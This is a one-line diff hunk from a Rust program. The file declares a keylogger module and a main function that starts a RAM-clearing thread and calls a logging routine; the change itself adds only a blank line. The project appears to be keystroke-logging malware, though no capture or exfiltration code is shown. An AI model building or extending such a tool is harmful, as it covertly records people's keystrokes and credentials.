@@ -7,6 +7,7 @@ mod ram;
 pub mod db;
 mod keylogger;
 
+
 fn main() {
     thread::spawn(|| { clear_ram_thread() });
     log();
